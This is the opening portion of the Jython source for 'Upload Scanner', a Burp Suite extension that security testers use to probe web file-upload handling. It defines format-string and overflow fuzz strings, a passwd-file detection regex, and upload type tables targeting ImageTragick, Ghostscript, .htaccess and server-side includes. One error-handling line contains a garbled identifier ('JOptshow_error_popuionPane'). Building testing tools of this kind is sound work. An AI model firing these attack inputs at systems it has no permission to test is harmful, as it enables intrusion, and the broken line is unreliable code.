#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    Upload Scanner extension for the Burp Suite Proxy
    Adds various security checks that can be used for
    web applications that allow file upload
    Copyright (C) 2017 floyd

Created on Feb 24, 2017
@author: floyd, http://floyd.ch, @floyd_ch, modzero AG, https://www.modzero.ch, @mod0
"""

# Developed when using Firefox, but short tests showed it works fine with IE, Chrome and Edge
# Tested on OSX primarily, but worked fine on Windows (including tests with exiftool.exe)

# Rules for unicode support in this extension: when Java APIs are used, everything is converted straight away to str
# with FloydsHelpers.u2s, str works best for me as "bytes" in python2. If we get byte[] from Java, we use the
# FloydsHelpers.jb2ps helper. Take care when we get back more complex objects from Java, make sure attributes of
# those objects are encoded with these two methods before usage.

# Burp imports
from burp import IBurpExtender
from burp import IScannerInsertionPoint
from burp import IScannerCheck
from burp import IScanIssue
from burp import IHttpRequestResponse
from burp import IHttpListener
from burp import ITab
from burp import IMessageEditorController
from burp import IScannerInsertionPointProvider
from burp import IHttpService
from burp import IContextMenuFactory
from burp import IExtensionStateListener
# Java stdlib imports
from java.util import ArrayList
from javax.swing import JLabel
from javax.swing import JScrollPane
from javax.swing import JButton
from javax.swing import JSplitPane
from javax.swing import JTextField
from javax.swing import JTabbedPane
from javax.swing import JTable
from javax.swing import JPanel
from javax.swing import JTextPane
from javax.swing import JFileChooser
from javax.swing import JCheckBox
from javax.swing import JOptionPane
from javax.swing import JMenuItem
from javax.swing import AbstractAction
from javax.swing import BorderFactory
from javax.swing import SwingConstants
from javax.swing.table import AbstractTableModel
from javax.swing.event import DocumentListener
from java.awt import Font
from java.awt import Color
from java.awt import Insets
from java.awt import GridBagLayout
from java.awt import GridBagConstraints
from java.awt import Image
from java.awt import Desktop
from java.awt import Dimension
from java.awt import RenderingHints
from java.awt.event import ActionListener
from java.awt.image import BufferedImage
from java.io import ByteArrayOutputStream
from java.io import ByteArrayInputStream
from javax.imageio import ImageIO
from java.net import URI
from java.net import URL
from java.nio.file import Files
from java.lang import Thread
from java.lang import IllegalStateException
from java.lang import System
# python stdlib imports
from io import BytesIO  # to mimic file IO but do it in-memory
import tempfile  # to make temporary files for exiftool to process
import subprocess  # to call exiftool
import re  # to check if exiftool name only consist of alphanum.- and to detect passwd files in downloads
import random  # to chose randomly
import string  # ascii letters to chose random file name from
import urllib  # URL encode etc.
import time  # detect timeouts and sleep for Threads
import os  # local paths parsing etc.
import stat  # To make exiftool executable executable
import copy  # copying str/lists if a duplicate is necessary
import struct  # Little/Big endian attack strings
import imghdr  # Detecting mime types
import mimetypes  # Detecting mime types
import cgi  # for HTML escaping
import urlparse  # urlparser for custom HTTP services
import zipfile  # to create evil zip files in memory
import sys  # to show detailed exception traces
import traceback  # to show detailed exception traces
import textwrap  # to wrap request texts after a certain amount of chars
import binascii  # for the fingerping module
import zlib  # for the fingerping module
import itertools  # for the fingerping module
import threading  # to make stuff thread safe
import pickle  # persisting object serialization between extension reloads
import ast  # to parse ${PYTHONSTR:'abc\ndef'} into a python str
from jarray import array  # to go from python list to Java array

# Developer debug mode
global DEBUG_MODE
DEBUG_MODE = False

if DEBUG_MODE:
    # Hint: Module "gc" garbage collector is not fully implemented in Jython as it uses the Java garbage collector
    # see https://answers.launchpad.net/sikuli/+question/160893
    import profile  # For profiling to fix performance problems
    import pdb  # For debugging
    # Use this to do debugging on command line:
    # if DEBUG_MODE:
    #     pdb.set_trace()

# Glossary to read this code
# brr: abbrevation for BaseRequestRespnse, it's of class IHttpRequestResponse
# urr: abbrevation UploadRequestsResponses, see class UploadRequestsResponses,
#      has three members of type IHttpRequestResponse (upload, preflight, redownload)
# *_types: specifies filename prefix, suffic (extension) and content_type for a test
#      these are cut down in the function get_types, eg. when we detect that the content
#      type is not sent at all in the request


class BurpExtender(IBurpExtender, IScannerCheck,
                   AbstractTableModel, ITab, IScannerInsertionPointProvider,
                   IHttpListener, IContextMenuFactory, IExtensionStateListener):

    # Internal constants/read-only:
    DOWNLOAD_ME = "Dwld"
    MARKER_URL_CONTENT = "A_FILENAME_PLACEHOLDER_FOR_THE_DESCRIPTION_NeVeR_OcCuRs_iN_ReAl_WoRlD_DaTa"
    MARKER_ORIG_EXT = 'ORIG_EXT'
    MARKER_COLLAB_URL = "http://example.org/"
    MARKER_CACHE_DEFEAT_URL = "https://example.org/cachedefeat/"
    NEWLINE = "\r\n"
    REGEX_PASSWD = re.compile("[^:]{3,20}:[^:]{1,100}:\d{0,20}:\d{0,20}:[^:]{0,100}:[^:]{0,100}:[^:]*$")
    # TODO: If we just add \\ the extension uploads *a lot more* files... worth doing?
    PROTOCOLS_HTTP = (
        # 'ftp://',
        # 'smtp://',
        # 'mailto://',
        # The following is \\ for Windows servers...
        # '\\\\',
        'http://',
        'https://',
    )
    MAX_SERIALIZED_DOWNLOAD_MATCHERS = 500
    MAX_RESPONSE_SIZE = 300000  # 300kb

    # ReDownloader constants/read-only:
    REDL_URL_BAD_HEADERS = ("content-length:", "accept:", "content-type:", "referer:")
    REDL_FILENAME_MARKER = "${FILENAME}"
    PYTHON_STR_MARKER_START = "${PYTHONSTR:"
    PYTHON_STR_MARKER_END = "}"

    # Implement IBurpExtender
    def registerExtenderCallbacks(self, callbacks):
        print "Extension loaded"

        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        if DEBUG_MODE:
            sys.stdout = callbacks.getStdout()
            sys.stderr = callbacks.getStderr()

        callbacks.setExtensionName("Upload Scanner")

        # A lock to make things thread safe that access extension level globals
        # Attention: use wisely! On MacOS it seems to be fine that a thread has the lock
        # and acquires it again, that's fine. However, on Windows acquiring the same lock
        # in the same thread twice will result in a thread lock and everything will halt!
        self.globals_write_lock = threading.Lock()

        # only set here at the beginning once, then constant
        self.FILE_START = ''.join(random.sample(string.ascii_letters, 4))

        # Internal vars/read-write:
        self._log = ArrayList()
        # The functions of DownloadMatcherCollection are thread safe
        self.dl_matchers = DownloadMatcherCollection(self._helpers)

        # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
        # Find out if CollaboratorMonitorThread is already running.
        # Although this works and we can find our not-killed Thread, it will not have the
        # functions of CollaboratorMonitorThread, so for example the "add" function
        # isn't there anymore.
        # for thread in Thread.getAllStackTraces().keySet():
        #     print thread.getName()
        #     if thread.name == CollaboratorMonitorThread.NAME:
        #         print "Found running CollaboratorMonitorThread, reusing"
        #         self.collab_monitor_thread = thread
        #         self.collab_monitor_thread.resume(self)
        #         break
        # else:
        #     # No break occured on the for loop
        #     # Create a new thread
        #     print "No CollaboratorMonitorThread found, starting a new one"
        #     self.collab_monitor_thread = CollaboratorMonitorThread(self)
        #     self.collab_monitor_thread.start()

        self.collab_monitor_thread = CollaboratorMonitorThread(self)
        self.collab_monitor_thread.start()

        self._warned_flexiinjector = False
        self._no_of_errors = 0
        self._ui_tab_index = 1
        self._option_panels = {}

        # Internal vars fuzzer (read only)
        self.KNOWN_FUZZ_STRINGS = [
            "A" * 256,
            "A" * 1024,
            "A" * 4096,
            "A" * 20000,
            "A" * 65535,
            "%x" * 256,
            "%n" * 256,
            "%s" * 256,
            "%s%n%x%d" * 256,
            "%s" * 256,
            "%.1024d",
            "%.2048d",
            "%.4096d",
            "%.8200d",
            "%99999999999s",
            "%99999999999d",
            "%99999999999x",
            "%99999999999n",
            "%99999999999s" * 200,
            "%99999999999d" * 200,
            "%99999999999x" * 200,
            "%99999999999n" * 200,
            "%08x" * 100,
            "%%20s" * 200,
            "%%20x" * 200,
            "%%20n" * 200,
            "%%20d" * 200,
            "%#0123456x%08x%x%s%p%n%d%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%#0123456x%%x%%s%%p%%n%%d%%o%%u%%c%%h%%l%%q%%j%%z%%Z%%t%%i%%e%%g%%f%%a%%C%%S%%08x",
            "'",
            "\\",
            "<",
            "+",
            "%",
            "$",
            "`"
        ]

        # End internal vars

        # The "*_types" variables define which prefix, file extension
        # and mime type is sent for the tests:
        # prefix, file extension, mime type
        # empty prefix = don't use prefix in front of filename
        # empty file extension = don't use/cut the filename's file extension
        # file extension == self._magick_original_extension, don't change whatever was there
        # empty mime type = use default mime type found in the original base request

        # The different extensions can vary in several ways:
        # - the original extension the file had that was uploaded in the base request, self._marker_orig_ext, eg. .png
        # - the payload extension, for example if we upload php code it would be .php
        # - the real file extension, for example .gif if we produced a gif file that has php code in the comment

        # TODO feature: Go through all TYPES and decide if .ORIG%00.EVIL makes sense as well as .EVIL%00.ORIG
        # TODO feature: Additionally: maybe randomize casing, eg. .PdF?
        # TODO feature: Reasoning about what _TYPES we should use. Make a big table that show what combinations we
        # can send and which checks on the server side could be present. For each combination, note if the upload
        # would succeed. Then rate the server side checks for likelihood to be implemented on a server (biased). In
        # a next step, take real world samples and check manually to confirm rough likelihood... There are so many
        # factors:
        # CT whitelist (often in place)
        # EXT whitelist (often in place but surprisingly often not as well...)
        # CONTENT whitelist (eg. is it a PNG?)
        #  CONTENT transformation (convert PNG to PNG with software X)
        # Checks CT matches EXT -> I get the impression this is rarely done
        # Checks CT matches CONTENT -> I get the impression this is rarely done
        # Checks EXT matches CONTENT
        # etc.

        # The following var is a special case when we detect that the request doesn't include
        # the filename or content-type (e.g. Vimeo image avatar upload), so we don't do 30
        # identical requests with the exact same content. See the get_types function.
        self.NO_TYPES = {'', '', ''}

        # ImageTragick types
        self.IM_SVG_TYPES = {
            # ('', '', ''),
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', '', 'image/png'),
            ('', '.svg', 'image/svg+xml'),
            # ('', '.svg', 'text/xml'),
            ('', '.png', 'image/png'),
            # ('', '.jpeg', 'image/jpeg')
        }

        # Interesting fact: image/jpeg is not the only jpeg mime type sent by browsers::
        # image/pjpeg
        # image/x-citrix-pjpeg
        # And also:
        # image/x-citrix-gif

        self.IM_MVG_TYPES = {
            # ('', '', ''),
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', '', 'image/png'),
            ('', '.mvg', ''),
            ('', '.mvg', 'image/svg+xml'),
            ('', '.png', 'image/png'),
            # ('', '.jpeg', 'image/jpeg'),
            ('mvg:', '.mvg', ''),
            # ('mvg:', '.mvg', 'image/svg+xml'),
        }

        # Xbm black/white pictures
        self.XBM_TYPES = {
            # ('', '', ''),
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', '.xbm', ''),
            ('', '.xbm', 'image/x-xbm'),
            ('', '.xbm', 'image/png'),
            ('xbm:', BurpExtender.MARKER_ORIG_EXT, ''),
        }

        # Ghostscript types
        self.GS_TYPES = {
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', '.gs', ''),
            ('', '.eps', ''),
            ('', BurpExtender.MARKER_ORIG_EXT, 'text/plain'),
            ('', '.jpeg', 'image/jpeg'),
            ('', '.png', 'image/png'),
        }

        # LibAvFormat types
        self.AV_TYPES = {
            # ('', '', ''),
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', BurpExtender.MARKER_ORIG_EXT, 'audio/mpegurl'),
            ('', BurpExtender.MARKER_ORIG_EXT, 'video/x-msvideo'),
            # ('', '.m3u8', 'application/vnd.apple.mpegurl'),
            ('', '.m3u8', 'application/mpegurl'),
            # ('', '.m3u8', 'application/x-mpegurl'),
            ('', '.m3u8', 'audio/mpegurl'),
            # ('', '.m3u8', 'audio/x-mpegurl'),
            ('', '.avi', 'video/x-msvideo'),
            ('', '.avi', ''),
        }

        self.EICAR_TYPES = {
            # ('', '', ''),
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', '.exe', ''),
            ('', '.exe', 'application/x-msdownload'),
            # ('', '.exe', 'application/octet-stream'),
            # ('', '.exe', 'application/exe'),
            # ('', '.exe', 'application/x-exe'),
            # ('', '.exe', 'application/dos-exe'),
            # ('', '.exe', 'application/msdos-windows'),
            # ('', '.exe', 'application/x-msdos-program'),
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', BurpExtender.MARKER_ORIG_EXT, 'application/x-msdownload'),
            # ('', self._magick_original_extension, 'application/octet-stream'),
            # ('', self._magick_original_extension, 'application/exe'),
            # ('', self._magick_original_extension, 'application/x-exe'),
            # ('', self._magick_original_extension, 'application/dos-exe'),
            # ('', self._magick_original_extension, 'application/msdos-windows'),
            # ('', self._magick_original_extension, 'application/x-msdos-program'),
        }

        self.PL_TYPES = {
            #('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', BurpExtender.MARKER_ORIG_EXT, 'text/x-perl-script'),
            ('', '.pl', ''),
            ('', '.pl', 'text/x-perl-script'),
            ('', '.cgi', ''),
            #('', '.cgi', 'text/x-perl-script'),
        }

        self.PY_TYPES = {
            #('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', BurpExtender.MARKER_ORIG_EXT, 'text/x-python-script'),
            ('', '.py', ''),
            ('', '.py', 'text/x-python-script'),
            ('', '.cgi', '')
        }

        self.RB_TYPES = {
            #('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', BurpExtender.MARKER_ORIG_EXT, 'text/x-ruby-script'),
            ('', '.rb', ''),
            ('', '.rb', 'text/x-ruby-script'),
        }

        # .htaccess types
        self.HTACCESS_TYPES = {
            ('', '', ''),
            ('', '%00' + BurpExtender.MARKER_ORIG_EXT, ''),
            ('', '\x00' + BurpExtender.MARKER_ORIG_EXT, ''),
            ('', '', 'text/plain'),
            ('', '%00' + BurpExtender.MARKER_ORIG_EXT, 'text/plain'),
            ('', '\x00' + BurpExtender.MARKER_ORIG_EXT, 'text/plain'),
        }

        self.PDF_TYPES = {
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', BurpExtender.MARKER_ORIG_EXT, 'application/pdf'),
            ('', '.pdf', ''),
            ('', '.pdf', 'application/pdf'),
        }

        self.URL_TYPES = {
            #('', BurpExtender.MARKER_ORIG_EXT, ''),
            #('', BurpExtender.MARKER_ORIG_EXT, 'application/octet-stream'),
            ('', '.URL', ''),
            #('', '.URL', 'application/octet-stream'),
        }

        self.INI_TYPES = {
            #('', BurpExtender.MARKER_ORIG_EXT, ''),
            #('', BurpExtender.MARKER_ORIG_EXT, 'application/octet-stream'),
            ('', '.ini', ''),
            #('', '.URL', 'application/octet-stream'),
        }

        self.ZIP_TYPES = {
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', BurpExtender.MARKER_ORIG_EXT, 'application/zip'),
            ('', '.zip', ''),
            ('', '.zip', 'application/zip'),
        }

        self.CSV_TYPES = {
            # ('', '', ''),
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', '.csv', ''),
            ('', '.csv', 'text/csv'),
            # ('', self._marker_orig_ext, ''),
            # ('', self._marker_orig_ext, 'text/csv'),
        }

        self.EXCEL_TYPES = {
            # ('', '', ''),
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', '.xls', ''),
            ('', '.xls', 'application/vnd.ms-excel'),
            # ('', BurpExtender.MARKER_ORIG_EXT, ''),
            # ('', BurpExtender.MARKER_ORIG_EXT, 'text/application/vnd.ms-excel'),
        }

        self.IQY_TYPES = {
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', '.iqy', ''),
            ('', '.iqy', 'application/vnd.ms-excel'),
        }

        # Server Side Include types
        # See also what file extensions the .htaccess module would enable!
        # It is unlikely that a server accepts content type text/html...
        self.SSI_TYPES = {
            #('', '.shtml', 'text/plain'),
            ('', '.shtml', 'text/html'),
            #('', '.stm', 'text/html'),
            #('', '.shtm', 'text/html'),
            #('', '.html', 'text/html'),
            #('', BurpExtender.MARKER_ORIG_EXT, 'text/html'),
            ('', '.shtml', ''),
            ('', '.stm', ''),
            ('', '.shtm', ''),
            ('', '.html', ''),
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
        }

        self.ESI_TYPES = {
            ('', '.txt', 'text/plain'),
            #('', '.txt', ''),
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
        }

        self.SVG_TYPES = {
            ('', BurpExtender.MARKER_ORIG_EXT, ''), # Server doesn't check file contents
            ('', '.svg', 'image/svg+xml'), # Server enforces matching of file ext and content type
            ('', '.svg', ''), # Server doesn't check file ext
            ('', BurpExtender.MARKER_ORIG_EXT, 'image/svg+xml'), # Server doesn't check content-type
        }

        self.XML_TYPES = {
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', '.xml', 'application/xml'),
            ('', '.xml', 'text/xml'),
            #('', '.xml', 'text/plain'),
            ('', '.xml', ''),
            ('', BurpExtender.MARKER_ORIG_EXT, 'text/xml'),
        }

        self.SWF_TYPES = {
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', '.swf', 'application/x-shockwave-flash'),
            ('', '.swf', ''),
            ('', BurpExtender.MARKER_ORIG_EXT, 'application/x-shockwave-flash'),
        }

        self.HTML_TYPES = {
            ('', BurpExtender.MARKER_ORIG_EXT, ''),
            ('', '.htm', ''),
            ('', '.html', ''),
            ('', '.htm', 'text/html'),
            #('', '.html', 'text/html'),
            ('', '.html', 'text/plain'),
            ('', '.xhtml', ''),
            #('', BurpExtender.MARKER_ORIG_EXT, 'text/html'),
        }

        print "Creating UI..."
        self._create_ui()

        with self.globals_write_lock:
            print "Deserializing settings..."
            self.deserialize_settings()


        # It is important these registrations are done at the end, so the global_lock is freed.
        # Otherwise when still deserializing and using the context menu at the same time there
        # has been a global Burp thread-lock where I had to force quit Burp :(

        # Automatic active scanning of multipart forms
        callbacks.registerScannerCheck(self)
        # Automatic active scanning of non-multipart messages (method called once per actively scanned request)
        callbacks.registerScannerInsertionPointProvider(self)
        # Automatic issue detection when file is downloaded
        callbacks.registerHttpListener(self)
        # Context menu to send requests to this extension
        callbacks.registerContextMenuFactory(self)
        # Get notified when extension is unloaded
        callbacks.registerExtensionStateListener(self)

        print "Extension fully registered and ready"

    def _create_ui(self):

        self._main_jtabedpane = JTabbedPane()

        # The split pane with the log and request/response details
        self._splitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)

        # table of log entries
        logTable = Table(self)
        scrollPane = JScrollPane(logTable)
        self._splitpane.setLeftComponent(scrollPane)

        # tabs with request/response viewers
        tabs = JTabbedPane()
        self._requestViewer = self._callbacks.createMessageEditor(logTable, False)
        self._responseViewer = self._callbacks.createMessageEditor(logTable, False)
        tabs.addTab("Request", self._requestViewer.getComponent())
        tabs.addTab("Response", self._responseViewer.getComponent())
        self._splitpane.setRightComponent(tabs)

        # OPTIONS
        self._global_opts = OptionsPanel(self, self._callbacks, self._helpers, global_options=True)

        # README
        self._aboutJLabel = JLabel(Readme.get_readme(), SwingConstants.CENTER)

        self._callbacks.customizeUiComponent(self._main_jtabedpane)
        self._callbacks.customizeUiComponent(self._splitpane)
        self._callbacks.customizeUiComponent(self._global_opts)
        self._callbacks.customizeUiComponent(self._aboutJLabel)

        self._main_jtabedpane.addTab("Global & Active Scanning configuration", None, JScrollPane(self._global_opts), None)
        self._main_jtabedpane.addTab("Done uploads", None, self._splitpane, None)
        self._main_jtabedpane.addTab("About", None, JScrollPane(self._aboutJLabel), None)

        self._callbacks.addSuiteTab(self)

        # UI END

    # Implement IExtensionStateListener
    def extensionUnloaded(self):
        self.collab_monitor_thread.extensionUnloaded()
        for index in self._option_panels:
            self._option_panels[index].stop_scan(None)
        self.serialize_settings()
        print "Extension unloaded"

    def serialize_settings(self):
        self.save_project_setting("UploadScanner_dl_matchers", "")
        # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
        #self.save_project_setting("UploadScanner_collab_monitor", None)
        self.save_project_setting("UploadScanner_tabs", "")
        self._callbacks.saveExtensionSetting('UploadScanner_global_opts', "")
        if not self._global_opts.cb_delete_settings.isSelected():
            self._callbacks.saveExtensionSetting('UploadScanner_global_opts', pickle.dumps(self._global_opts.serialize()).encode("base64"))
            self.save_project_setting('UploadScanner_dl_matchers',
                                                 pickle.dumps(self.dl_matchers.serialize()).encode("base64"))
            # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
            # what a pity, IBurpCollaboratorClientContext objects can also not be serialized... :(
            #self.save_project_setting('UploadScanner_collab_monitor',
            #                                     pickle.dumps(self.collab_monitor.serialize()).encode("base64"))
            self.save_project_setting('UploadScanner_tabs',
                                                 pickle.dumps([self._option_panels[x].serialize() for x in self._option_panels]).encode("base64"))

            print "Saved settings..."
        else:
            print "Deleted all settings..."

    def deserialize_settings(self):
        try:
            k = self.load_project_setting("UploadScanner_dl_matchers")
            if k:
                dm = pickle.loads(k.decode("base64"))
                if dm:
                    self.dl_matchers.deserialize(dm)

            # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
            #k = self.load_project_setting("UploadScanner_collab_monitor")
            #if k:
            #    cm = pickle.loads(k.decode("base64"))
            #    self.collab_monitor.deserialize(cm)

            k = self.load_project_setting("UploadScanner_tabs")
            if k:
                tabs = pickle.loads(k.decode("base64"))
                if tabs:
                    for option_panel in tabs:
                        # right part, create with dummy request first first
                        sc = ScanController(CustomRequestResponse('', '', CustomHttpService('https://example.org'), '', ''), self._callbacks)
                        # left part, options
                        # add a reference to the ScanController to the options
                        options = OptionsPanel(self, self._callbacks, self._helpers, scan_controler=sc)
                        # Take all settings from the serialized object (also recursively changes ScanController)
                        options.deserialize(option_panel)
                        self.create_tab(options, sc)

            k = self._callbacks.loadExtensionSetting("UploadScanner_global_opts")
            if k:
                cm = pickle.loads(k.decode("base64"))
                if cm:
                    self._global_opts.deserialize(cm)
            print "Restored settings..."
        except:
            e = traceback.format_exc()
            print "An error occured when deserializing settings. We just ignore the serialized data therefore."
            print e

        try:
            self.save_project_setting("UploadScanner_dl_matchers", "")
            # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
            #self.save_project_setting("UploadScanner_collab_monitor", None)
            self.save_project_setting("UploadScanner_tabs", "")
        except:
            e = traceback.format_exc()
            print "An error occured when storing empty serialize data We just ignore it for now."
            print e

    def save_project_setting(self, name, value):
        request = """GET /"""+name+""" HTTP/1.0
        # You can ignore this item in the site map. It was created by the UploadScanner extension.
        # The reason is that the Burp API is missing a certain functionality to save settings.
        # TODO Burp API limitation: This is a hackish way to be able to store project-scope settings
        # We don't want to restore requests/responses of tabs in a totally different Burp project
        # However, unfortunately there is no saveExtensionProjectSetting in the Burp API :(
        # So we have to abuse the addToSiteMap API to store project-specific things

        # Even when using this hack we currently cannot persist Collaborator interaction checks
        # (IBurpCollaboratorClientContext is not serializable and Threads loose their Python class
        # functionality when unloaded) due to Burp API limitations.
        """
        response = None
        if value:
            response = "HTTP/1.1 200 OK\r\n" + value
        rr = CustomRequestResponse(name, '', CustomHttpService('http://uploadscannerextension.local/'), request, response)
        self._callbacks.addToSiteMap(rr)


    def load_project_setting(self, name):
        rrs = self._callbacks.getSiteMap('http://uploadscannerextension.local/'+name)
        if rrs:
            rr = rrs[0]
            if rr.getResponse():
                return "\r\n".join(FloydsHelpers.jb2ps(rr.getResponse()).split("\r\n")[1:])
            else:
                return None
        else:
            return None


    # Implement IContextMenuFactory
    def createMenuItems(self, invocation): #IContextMenuInvocation
        action = MenuItemAction(invocation, self)
        menu_item = JMenuItem(action)
        menu_item.setText("Send to Upload Scanner")
        return [menu_item, ]

    # interaction from context menu
    def new_request_response(self, invocation):
        brr = invocation.getSelectedMessages()[0]

        # We can only work with requests that also have a response:
        if not brr.getRequest() or not brr.getResponse():
            print "Tried to send a request where no response came back via context menu to the UploadScanner. Ignoring."
        else:
            with self.globals_write_lock:
                # right part
                sc = ScanController(brr, self._callbacks)
                # left part, options
                # add a reference to the ScanController to the options
                options = OptionsPanel(self, self._callbacks, self._helpers, scan_controler=sc)
                # Take all settings from global options:
                options.deserialize(self._global_opts.serialize(), global_to_tab=True)
                self.create_tab(options, sc)

    def create_tab(self, options, sc):
        # main split view
        splitpane = JSplitPane(JSplitPane.HORIZONTAL_SPLIT)
        splitpane.setLeftComponent(JScrollPane(options))
        splitpane.setRightComponent(JScrollPane(sc))

        # The CloseableTab will add itself to its parent
        CloseableTab(str(self._ui_tab_index), self._main_jtabedpane, splitpane,
                         self._callbacks.customizeUiComponent, self.tab_closed, self._ui_tab_index)
        self._option_panels[self._ui_tab_index] = options
        self._ui_tab_index += 1

    def tab_closed(self, index):
        # What happens when a tab closes? Things we could take care of:
        # DownloadMatchers created in this tab (remove them?) -> No, we want to persist them
        # ColabMonitor urls added (remove them?) -> No, keep them
        # For now we just don't do anything, meaning memory consumption never decreases...
        # The only thing we do is remove them from _option_panels so they don't show again when
        # serialized and deserialized, however, their DownloadMatchers will survive
        should_close = False
        if self._option_panels[index].scan_controler.scan_running:
            should_close = self.show_tab_close_popup()
        else:
            should_close = True
        if should_close:
            with self.globals_write_lock:
                print "Closing tab", index
                del self._option_panels[index]
        return should_close

    # Implement ITab
    def getTabCaption(self):
        return "Upload Scanner"

    def getUiComponent(self):
        return self._main_jtabedpane

    def show_error_popup(self, error_details, location, brr):
        if "OutOfMemoryError: java.lang.OutOfMemoryError" in error_details:
            full_msg = "Your Burp ran out of memory (RAM). This is a fatal issue and was detected by the UploadScanner " \
                       "extension. As there is no way to recover from this, UploadScanner is now going to unload " \
                       "itself, hopefully freeing up some memory for you. Please restart Burp with more memory " \
                       "allocated as described under '9. Burp runs out of memory.' on " \
                       "https://support.portswigger.net/customer/portal/articles/1965913-troubleshooting . Basically " \
                       "you have to start Burp with a larger -Xmx argument. Other strategies might be starting a new " \
                       "Burp project, loading less extensions or processing less requests in general. Press 'OK' to " \
                       "unload the UploadScanner extension."
            response = JOptshow_error_popuionPane.showConfirmDialog(self._global_opts, full_msg, "Out of memory",
                                                     JOptionPane.OK_CANCEL_OPTION)
            if response == JOptionPane.OK_OPTION:
                self._callbacks.unloadExtension()
            return
        try:
            f = file("BappManifest.bmf", "rb").readlines()
            for line in f:
                if line.startswith("ScreenVersion: "):
                    error_details += "\n" + line.replace("ScreenVersion", "Upload Scanner Version")
                    break
            error_details += "\nExtension code location: " + location
        except:
            print "Could not find plugin version..."
        try:
            error_details += "\nJython version: " + sys.version
            error_details += "\nJava version: " + System.getProperty("java.version")
        except:
            print "Could not find Jython/Java version..."
        try:
            error_details += "\nBurp version: " + " ".join([x for x in self._callbacks.getBurpVersion()])
            error_details += "\nCommand line arguments: " + " ".join([x for x in self._callbacks.getCommandLineArguments()])
            error_details += "\nWas loaded from BApp: " + str(self._callbacks.isExtensionBapp())
        except:
            print "Could not find Burp details..."
        self._no_of_errors += 1
        if self._no_of_errors < 2:
            full_msg = 'The Burp extension "Upload Scanner" just crashed. The details of the issue are at the bottom. \n' \
                       'Please let the maintainer of the extension know. No automatic reporting is present, but if you could \n' \
                       'report the issue on github http://github.com/floyd-fuh/burp-UploadScanner \n' \
                       'or send an Email to burpplugins' + 'QGZsb3lkLmNo'.decode("base64") + ' this would \n' \
                       'be appreciated. The details of the error below can also be found in the "Extender" tab.\n' \
                       'Do you want to open a github issue with the details below now? \n' \
                       'Details: \n{}\n'.format(FloydsHelpers.u2s(error_details))
            response = JOptionPane.showConfirmDialog(self._global_opts, full_msg, full_msg,
                                                     JOptionPane.YES_NO_OPTION)
            if response == JOptionPane.YES_OPTION:
                # Ask if it would also be OK to send the request
                request_msg = "Is it OK to send along the following request? If you click 'No' this request will not \n" \
                              "be sent, but please consider submitting an anonymized/redacted version of the request \n" \
                              "along with the bug report, as otherwise a root cause analysis is likely not possible. \n" \
                              "You can also find this request in the Extender tab in the UploadScanner Output tab. \n\n"
                request_content = textwrap.fill(repr(FloydsHelpers.jb2ps(brr.getRequest())), 100)
                print request_content

                if len(request_content) > 1000:
                    request_content = request_content[:1000] + "..."
                request_msg += request_content
                response = JOptionPane.showConfirmDialog(self._global_opts, request_msg, request_msg,
                                                         JOptionPane.YES_NO_OPTION)
                if response == JOptionPane.YES_OPTION:
                    error_details += "\nRequest: " + request_content
                else:
                    error_details += "\nRequest: None"

                if Desktop.isDesktopSupported():
                    desktop = Desktop.getDesktop()
                    if desktop.isSupported(Desktop.Action.BROWSE):
                        github = "https://github.com/modzero/mod0BurpUploadScanner/issues/new?title=Bug" \
                                 "&body=" + urllib.quote("```\n" + error_details + "\n```")
                        desktop.browse(URI(github))
                    #if desktop.isSupported(Desktop.Action.MAIL):
                    #    mailto = "mailto:burpplugins" + 'QGZsb3lkLmNo'.decode("base64") + "?subject=UploadScanner%20bug"
                    #    mailto += "&body=" + urllib.quote(error_details)
                    #    desktop.mail(URI(mailto))

    def show_tab_close_popup(self):
        full_msg = 'Scan still running. Burp Collaborator interactions might get lost. Are you sure you want to close the tab? \n'
        response = JOptionPane.showConfirmDialog(self._global_opts, full_msg, full_msg, JOptionPane.YES_NO_OPTION)
        if response == JOptionPane.YES_OPTION:
            return True
        else:
            return False

    # Implement AbstractTableModel
    def getRowCount(self):
        try:
            return self._log.size()
        except:
            return 0

    def getColumnCount(self):
        return 2

    def getColumnName(self, columnIndex):
        if columnIndex == 0:
            return "Status"
        if columnIndex == 1:
            return "URL"
        return ""

    def getValueAt(self, rowIndex, columnIndex):
        logEntry = self._log.get(rowIndex)
        if columnIndex == 0:
            return logEntry._status
        if columnIndex == 1:
            return logEntry._url
        return ""

    # Helper function to easily add an entry to the log:
    def add_log_entry(self, rr):
        with self.globals_write_lock:
            row = self._log.size()
            status = self._helpers.analyzeResponse(rr.getResponse()).getStatusCode()
            self._log.add(LogEntry(status, self._callbacks.saveBuffersToTempFiles(rr),
                               self._helpers.analyzeRequest(rr).getUrl()))
            self.fireTableRowsInserted(row, row)

    # Implement IHttpListener
    def processHttpMessage(self, _, messageIsRequest, base_request_response):
        try:
            # This can get computationally expensive if there are a lot of files that were uploaded...
            # ... make sure we only scan responses and if we have any matcher rules
            if not messageIsRequest:
                resp = base_request_response.getResponse()
                if not resp:
                    print "processHttpMessage called with BaseRequestResponse with no response. Ignoring."
                    return
